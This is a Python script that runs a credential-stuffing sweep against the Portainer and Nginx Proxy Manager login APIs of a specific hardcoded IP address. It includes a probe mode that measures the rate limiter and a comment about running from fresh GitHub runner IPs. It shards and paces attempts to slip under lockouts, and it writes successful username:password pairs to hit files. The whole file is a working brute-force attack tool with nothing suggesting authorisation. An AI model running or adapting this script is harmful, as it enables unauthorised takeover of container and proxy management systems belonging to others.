#!/usr/bin/env python3
# pick-claim management-plane credential sweep from a fresh GitHub runner IP.
# Modes: probe | pt (Portainer :9443) | npm (Nginx Proxy Manager :81)
# Paced (rate-based limiter), sharded, logs every status code.
import os, sys, time, json, base64, gzip, urllib3, requests
urllib3.disable_warnings()

MODE   = os.environ.get("MODE", "probe")
SHARD  = int(os.environ.get("SHARD", "0"))
SHARDS = int(os.environ.get("SHARDS", "1"))
PACE   = float(os.environ.get("PACE", "1.0"))
CORPUS = os.environ.get("CORPUS", "attack/corpus.txt")
MINLEN = int(os.environ.get("MINLEN", "12"))
PT_USERS = [u for u in os.environ.get("PT_USERS", "admin").split(",") if u]
NPM_IDENTITIES = [u for u in os.environ.get("NPM_IDENTITIES", "admin@example.com").split(",") if u]
HITDIR = os.environ.get("HITDIR", "hits")
os.makedirs(HITDIR, exist_ok=True)

PT  = "https://84.8.134.235:9443/api/auth"
NPM = "http://84.8.134.235:81/api/tokens"

def log(*a):
    print(*a, flush=True)

def egress_ip():
    for url in ("https://ifconfig.me", "https://api.ipify.org", "https://icanhazip.com"):
        try:
            r = requests.get(url, timeout=15, verify=False)
            if r.text.strip():
                return r.text.strip()
        except Exception:
            pass
    return "?"

def load_corpus():
    pw = []
    with open(CORPUS, "r", errors="ignore") as f:
        for line in f:
            s = line.rstrip("\n")
            if s and len(s) >= MINLEN:
                pw.append(s)
    seen = set(); out = []
    for p in pw:
        if p not in seen:
            seen.add(p); out.append(p)
    return [p for i, p in enumerate(out) if i % SHARDS == SHARD]

def hit(kind, user, pw, resp):
    fn = os.path.join(HITDIR, f"{kind}_{SHARD}.txt")
    with open(fn, "a") as f:
        f.write(f"{kind} HIT {user}:{pw} -> {resp}\n")
    log(f"***** {kind} HIT {user}:{pw} -> {resp} *****")

def probe():
    log("PROBE EGRESS_IP", egress_ip())
    log("PROBE PT status", requests.get("https://84.8.134.235:9443/api/status", verify=False, timeout=15).text[:120])
    log("PROBE NPM status", requests.get("http://84.8.134.235:81/api/", verify=False, timeout=15).text[:120])
    # 30 paced portainer attempts with garbage creds -> characterise limiter
    codes = []
    for i in range(30):
        try:
            r = requests.post(PT, json={"Username": "admin", "Password": "x"*14},
                              verify=False, timeout=15)
            codes.append(r.status_code)
        except Exception as e:
            codes.append("ERR")
        time.sleep(PACE)
    log("PROBE paced PT codes:", codes)

def sweep_pt(corpus):
    log(f"PT shard {SHARD}/{SHARDS} egress {egress_ip()} n={len(corpus)} users={PT_USERS} pace={PACE}")
    for i, pw in enumerate(corpus):
        for u in PT_USERS:
            try:
                r = requests.post(PT, json={"Username": u, "Password": pw},
                                  verify=False, timeout=15)
                sc = r.status_code
                if sc == 200:
                    hit("PORTAINER", u, pw, r.text[:300])
                elif sc == 403:
                    log(f"PT {i} {u} BANNED/403 -> {r.text[:80]}")
                elif i < 3 or i % 100 == 0:
                    log(f"PT {i}/{len(corpus)} {u} -> {sc}")
            except Exception as e:
                log(f"PT {i} ERR {e}")
            time.sleep(PACE)

def sweep_npm(corpus):
    log(f"NPM shard {SHARD}/{SHARDS} egress {egress_ip()} n={len(corpus)} ids={NPM_IDENTITIES} pace={PACE}")
    for i, pw in enumerate(corpus):
        for e in NPM_IDENTITIES:
            try:
                r = requests.post(NPM, json={"identity": e, "secret": pw},
                                  verify=False, timeout=15)
                sc = r.status_code
                if sc == 200:
                    hit("NPM", e, pw, r.text[:300])
                elif sc in (429, 403):
                    log(f"NPM {i} {e} -> {sc} {r.text[:80]}")
                elif i < 3 or i % 100 == 0:
                    log(f"NPM {i}/{len(corpus)} {e} -> {sc}")
            except Exception as e:
                log(f"NPM {i} ERR {e}")
            time.sleep(PACE)

if __name__ == "__main__":
    if MODE == "probe":
        probe()
    else:
        c = load_corpus()
        if MODE == "pt":
            sweep_pt(c)
        elif MODE == "npm":
            sweep_npm(c)
    log("DONE")
